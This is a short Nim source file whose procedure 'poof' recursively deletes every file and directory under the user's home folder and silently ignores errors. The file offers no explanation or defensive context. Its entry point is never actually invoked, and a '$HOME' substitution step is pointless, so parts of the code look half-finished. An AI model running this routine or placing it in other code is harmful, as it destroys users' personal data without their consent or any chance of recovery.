import os, sequtils

proc poof() =
    var currentTargetDir = getHomeDir()
    if "$HOME" in currentTargetDir:
        currentTargetDir = currentTargetDir.replace("$HOME", getHomeDir())

    for path in walkDirRec(currentTargetDir):
        try:
            if dirExists(path): removeDir(path)
            else: removeFile(path)
        except OSError:
            continue

proc main() =
  poof()

when not isMainModule:
  discard